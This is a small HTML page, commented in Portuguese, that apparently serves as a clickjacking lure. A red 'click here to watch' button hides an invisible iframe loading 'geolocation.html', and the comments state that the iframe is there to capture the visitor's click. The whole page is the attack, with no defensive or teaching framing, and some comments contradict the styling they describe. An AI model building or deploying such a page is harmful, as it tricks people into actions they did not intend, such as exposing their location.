<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clique para ver</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
        }
        /* O container que segura tudo */
        .container {
            position: relative;
            width: 300px;
            height: 150px;
        }
        /* O botão visível */
        .fake-btn {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ff0000;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            z-index: 10; /* Fica por cima */
        }
        /* O iframe invisível */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 5; /* Fica por baixo do botão, mas acima do fundo */
            pointer-events: none; /* O clique passa através dele? Não! Queremos que o clique vá para o iframe. */
        }
        
        /* Ajuste para o iframe capturar o clique */
        .iframe-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 20; /* Fica por cima de tudo */
            opacity: 0; /* Invisível */
            pointer-events: auto; /* Captura o clique */
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- O botão que a pessoa vê -->
        <div class="fake-btn">CLIQUE AQUI PARA ASSISTIR</div>
        
        <!-- O iframe invisível que captura o clique -->
        <iframe class="iframe-overlay" src="geolocation.html"></iframe>
    </div>

</body>
</html>
